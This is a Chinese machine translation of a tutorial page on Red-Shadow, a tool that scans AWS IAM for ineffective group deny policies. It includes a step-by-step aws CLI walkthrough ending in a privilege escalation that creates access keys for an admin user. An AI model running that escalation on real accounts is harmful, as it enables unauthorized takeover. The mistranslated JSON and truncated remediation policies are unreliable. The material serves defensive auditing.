# 红色阴影:Lightspin AWS IAM 漏洞扫描器

> 原文：<https://kalilinuxtutorials.com/red-shadow/>

[![Red-Shadow : Lightspin AWS IAM Vulnerability Scanner](img/f8eb3c8d6044d988356564c7bf23d54d.png "Red-Shadow : Lightspin AWS IAM Vulnerability Scanner")](https://1.bp.blogspot.com/-8qXFS2ULlYY/YOAnO4wqpuI/AAAAAAAAJzs/uTwdSwkUOqEoiZIpQEngUoubEK6mOd3xACLcBGAsYHQ/s728/red-shadow%2B%25281%2529.png)

**红影**是 Lightspin AWS IAM 漏洞扫描器的工具。

根据 Lightspin 的安全研究团队发现的错误配置的拒绝策略，扫描 AWS IAM 配置中的影子管理员，这些策略不会影响组中的用户。

该工具检测以下 IAM 对象中的错误配置:

*   **托管策略**
*   **用户内联策略**
*   **分组内联策略**
*   **角色内联策略**

**研究总结**

应用于组的拒绝策略的 AWS IAM 评估逻辑的工作方式与大多数安全工程师可能习惯的其他授权机制不同。

假设具有组资源的策略具有明确的拒绝。在这种情况下，这将只影响组操作，而不会影响用户操作，例如，如果组织假设该过程与活动目录相同，则会导致配置错误和漏洞。

易受攻击的 json 策略示例:

**{
"版本":" 2012-10-17 "，
"声明":[
{
" Sid ":" protectmanagersbydenie "，
"效果":" Deny "，
"动作":" * "，
"资源":" arn:aws:iam::123456789999:组/经理"
}
]
}**

在本例中，该策略应该拒绝附加了该策略的用户、组或角色对名为 managers 的组执行的任何 iam 操作。

事实是，像`**iam:ChangePassword**`这样简单的 IAM 操作会起作用，因为拒绝策略是无效的。

**检测**

AWS IAM 明确区分了用户对象操作和组对象操作。

以下列表包括该工具在影响组的拒绝策略中扫描的用户对象操作(除通配符之外。

**AWS _ user _ actions =[【iam:create user】、
【iam:getuser】、
【iam:update user】、
【iam:deleted user】、
【iam:getuser policy】、
【iam:putuser policy】、
【iam:deleteuser policy】、
iam:listuser policy**

上面提到的许多用户对象操作很容易导致权限提升或危及帐户安全，例如重置管理员密码、停用根帐户 MFA 等等。

**要求**

红影是用 Python 3 和 Boto3 构建的。

该工具需要:

*   [IAM 用户，在操作系统环境中具有访问密钥](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
*   [IAM 用户运行扫描仪的足够权限](https://github.com/lightspin-tech/red-shadow/blob/main/red-shadow-policy.json)
*   安装了 Python 3 和 pip3

**安装**

**sudo git 克隆 https://github.com/lightspin-tech/red-shadow.git
CD 红影
pip 3 install-r requirements . txt**

**用途**

**python3 red-shadow.py**

**分析结果**

结果会发现任何容易在 AWS 中绕过授权的 IAM 对象。

结果输出示例:

**++正在启动 red-shadow++
+++AWS IAM 漏洞扫描器
++ Red Shadow 根据错误配置的拒绝策略扫描 AWS IAM 中的影子管理员不影响组中的用户
步骤 1:在托管策略中搜索 IAM 组错误配置
在 arn:AWS:iam::123456789999:policy/protect managers
进度:|██████████████████████████████████████████████████| 100.0%完成
步骤 2:搜索 iam 组错误配置 100.0%完成
步骤 3:在组内联策略中搜索 IAM 组错误配置
进度:|██████████████████████████████████████████████████| 100.0%完成
步骤 4:在角色内联策略中搜索 IAM 组错误配置
进度:|██████████████████████████████████████████████████| 100.0%完成
完成**

在这个控制台输出中，我们可以看到我们的 ProtectManagers deny 策略是无效的，容易受到攻击，例如上面提到的特权提升。

**模拟&剥削**

要验证 IAM 漏洞并运行攻击，您可以运行以下流程:

*   `**aws iam create-group --group-name managers**`
*   `**aws iam attach-group-policy --group-name managers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess**`
*   `**aws iam create-user --user-name JohnAdmin**`
*   `**aws iam add-user-to-group --user-name JohnAdmin --group-name managers**`
*   使用以下内容创建一个 policy.json 文件(替换帐户 id):

**{
"版本":" 2012-10-17 "，
"声明":[
{
" Sid ":" protectmanagersbydenie "，
"效果":" Deny "，
"Action": "* "，
" Resource ":" arn:AWS:iam::123456789999:group/manager "
}
]
}**

*   **T2`aws iam create-policy --policy-name ProtectManagers --policy-document file://policy.json`**
*   **T2`aws iam create-group --group-name backend-dev`**
*   **T2`aws iam create-user --user-name BobAttacker`**
*   **T2`aws iam add-user-to-group --user-name BobAttacker --group-name backend-dev`**
*   **T2`aws iam attach-group-policy --group-name backend-dev --policy-arn arn:aws:iam::123456789999:policy/ProtectManagers`**
*   创建一个策略，允许用户在 policy_iam.json 文件中为后端开发组创建访问密钥:

**{
"Version": "2012-10-17 "，
" Statement ":[
{
" Sid ":" visual editor 0 "，
"Effect": "Allow "，
" Action ":" iam:CreateAccessKey "，
" Resource ":" * "
}
]
}**

*   **T2`aws iam create-policy --policy-name devCreateAccessKeys --policy-document file://policy_iam.json`**
*   **T2`aws iam attach-group-policy --group-name backend-dev --policy-arn arn:aws:iam::123456789999:policy/devCreateAccessKeys`**
*   使用 **`aws iam list-attached-group-policies --group backend-dev`** 验证我们的配置
*   **T2`aws iam create-access-key --user-name BobAttacker`**
*   在 aws 配置文件(locan env)中配置新的访问密钥和密码
*   现在，用户 BobAttacker 可以为所有资源创建访问密钥，但是对 managers 组有明确的 deny 权限。

**让我们利用以下漏洞:**

**AWS iam create-access-key–用户名 John admin–个人资料 bob 攻击者**

**权限提升完成！**

**补救**

一旦发现策略易受绕过授权的攻击，有两种可能的方法来补救漏洞和修复策略:

**选项 1:** 在资源域中定义所有相关用户，而不是组，以避免无效的 iam 动作，并拒绝所有组动作，如下例:

**{
"Version": "2012-10-17 "，
" Statement ":[
{
" Sid ":" denyspecificseractions "，
"Effect": "Deny "，
" Action ":[
" iam:CreateLoginProfile "，
"iam:ChangePassword "，
"iam:CreateAccessKey"
]，
" Resource ":[** 

**选项 2:** 在适当位置使用 iam:ResourceTag 的策略中的条件，如下例所示:

**{
"Version": "2012-10-17 "，
" Statement ":[
{
" Sid ":" visual editor 0 "，
"Effect": "Deny "，
" Action ":[
" iam:CreateLoginProfile "，
"iam:ChangePassword "，
"iam:CreateAccessKey"
，
【Resource】:" * "，** 

[**Download**](https://github.com/lightspin-tech/red-shadow)